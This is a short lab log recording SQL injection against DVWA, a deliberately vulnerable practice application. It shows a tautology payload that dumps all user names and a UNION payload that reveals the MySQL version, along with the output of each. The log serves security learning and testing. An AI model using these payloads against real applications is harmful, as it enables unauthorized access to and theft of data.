SQL Injection Payload Log & Analysis

Target Application: DVWA (SQL Injection Module)
Security Level: Low

1. Baseline Request (Normal Operation)

Payload Used: 1

Expected Query: SELECT first_name, last_name FROM users WHERE user_id = '1';

Result/Output: The application correctly retrieved the details for a single user.

ID: 1

First name: admin

Surname: admin

2. Exploit Payload 1: The Tautology (Always True)

Payload Used: %' or '0'='0

Purpose: To bypass the specific ID requirement by appending an OR condition that is universally true, forcing the database to dump all records in the table.

Result/Output: The injection was successful. The database returned the first and last names of all users in the system, exposing credentials/names that were not meant to be seen by the current user.

Exposed Data: admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith.

3. Exploit Payload 2: UNION-Based Data Extraction

Payload Used: 1' UNION SELECT null, @@version #

Purpose: The UNION operator is used to combine the result-set of two or more SELECT statements. The # symbol comments out the rest of the original query. This payload specifically asks the database to append its internal version number to the output.

Result/Output: The injection was successful. Alongside the user data, the application printed the exact database version string at the bottom of the output.

Exposed Data: 5.0.51a-3ubuntu5 (MySQL Version).

Security Impact: Revealing the exact database version allows an attacker to easily search for known exploits specific to that version of MySQL.
